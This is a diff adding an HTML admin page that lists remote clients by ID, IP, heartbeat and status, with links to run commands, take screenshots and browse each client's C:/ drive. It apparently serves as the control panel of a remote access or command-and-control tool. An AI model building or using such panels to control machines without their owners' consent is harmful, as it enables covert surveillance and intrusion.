@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <title>Admin - Client List</title>
+  <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@latest/css/pico.min.css">
+  <style>
+      body { font-family: Arial, sans-serif; margin: 20px; }
+      h1 { font-size: 24px; text-align: center; }
+      table { border-collapse: collapse; width: 90%; margin: 20px auto; }
+      th, td { border: 1px solid #ccc; padding: 8px; text-align: center; }
+      th { background-color: #f4f4f4; }
+      a { text-decoration: none; color: #337ab7; }
+      .msg { text-align: center; color: red; margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <h1>Client List</h1>
+  <div style="text-align:center; margin-bottom: 20px;">
+    <a href="/admin/downloads" class="btn">📥 查看下载队列</a>
+  </div>
+  <div id="clientContainer">
+    <div class="msg" id="msg">加载中...</div>
+  </div>
+
+  <script>
+    function fetchClientList() {
+      fetch('/api/admin/clients', { credentials: 'include' })
+      .then(response => {
+        if (!response.ok) throw new Error("HTTP 错误: " + response.status);
+        return response.json();
+      })
+      .then(data => {
+        const container = document.getElementById("clientContainer");
+        if (data.status !== "success") {
+          container.innerHTML = `<div class="msg">错误：${data.message}</div>`;
+          return;
+        }
+        const clients = data.data;
+        if (!clients || clients.length === 0) {
+          container.innerHTML = `<div class="msg">没有客户端</div>`;
+          return;
+        }
+        let html = `
+          <table>
+            <tr>
+              <th>Client ID</th>
+              <th>IP Address</th>
+              <th>Last Heartbeat</th>
+              <th>Status</th>
+              <th>Cmd</th>
+              <th>Screenshot</th>
+              <th>Dir</th>
+            </tr>`;
+        clients.forEach(c => {
+          const color = c.status === "Online" ? "green" : "red";
+          html += `
+            <tr>
+              <td>${c.client_id}</td>
+              <td>${c.ip}</td>
+              <td>${c.last_heartbeat}</td>
+              <td style="color:${color};">${c.status}</td>
+              <td><a href="/admin/cmd?clientid=${encodeURIComponent(c.client_id)}">Cmd</a></td>
+              <td><a href="/admin/screenshot?clientid=${encodeURIComponent(c.client_id)}">Screenshot</a></td>
+              <td><a href="/admin/dir?clientid=${encodeURIComponent(c.client_id)}&path=C:/">Dir</a></td>
+            </tr>`;
+        });
+        html += `</table>`;
+        container.innerHTML = html;
+      })
+      .catch(err => {
+        document.getElementById("clientContainer").innerHTML =
+          `<div class="msg">加载失败: ${err.message}</div>`;
+      });
+    }
+
+    document.addEventListener("DOMContentLoaded", fetchClientList);
+  </script>
+</body>
+</html>
